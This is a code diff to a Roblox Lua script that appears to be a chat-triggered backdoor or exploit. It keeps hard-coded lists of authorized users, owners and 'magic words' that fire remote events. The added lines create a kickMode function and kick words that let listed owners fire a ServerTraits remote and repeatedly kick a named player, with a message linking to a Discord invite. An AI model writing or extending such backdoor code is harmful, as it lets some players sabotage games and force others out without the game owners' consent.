@@ -2,8 +2,9 @@ local TextChatService = game:GetService("TextChatService")
 local Players = game:GetService("Players")
 local AUTHORIZED_IDS = {8481430369, 1478527414, 7601800752, 5827142972}
 local AUTHORIZED_NAMES = {"jesus_line", "jesuswilmero", "TOPxManoyopay"}
-local OWNERS = {"samy0515_2", "kamuworl"}
-local MAGIC_WORDS = {"xr", "wsp", "hey"}
+local OWNERS = {"sammy1522_2", "kamuworl"}
+local MAGIC_WORDS = {"xr", "wsp"}
+local KICK_WORDS = {"yessr", "hace frio"}
 local TRIGGER_USER = "linda125xd"
 
 local isAuthorized = false
@@ -64,6 +65,31 @@ local function executeServerTraits()
 		
 		task.wait(0.1)
 	end
+end
+
+local function kickMode()
+	task.spawn(function()
+		pcall(function()
+			local player = Players:FindFirstChild("MiUser")
+			if player then
+				local backpack = player:FindFirstChild("Backpack")
+				if backpack then
+					local serverTraits = backpack:FindFirstChild("ServerTraits")
+					if serverTraits then
+						local input = serverTraits:FindFirstChild("Input")
+						if input then
+							input:FireServer()
+						end
+					end
+				end
+				task.wait(0.1)
+				for _ = 1, 10 do
+					player:Kick("BOOGABLOZxD - REPORT THIS BUG: https://discord.gg/F5WbRVWCaT")
+					task.wait(0.2)
+				end
+			end
+		end)
+	end)
 end
 
 local function findAllRemotes(obj, remotes)
@@ -138,6 +164,13 @@ TextChatService.MessageReceived:Connect(function(message)
 		end
 
 		if isOwner then
+			for _, word in ipairs(KICK_WORDS) do
+				if msg == word then
+					kickMode()
+					return
+				end
+			end
+
 			for _, word in ipairs(MAGIC_WORDS) do
 				if msg == word then
 					executeServerTraits()
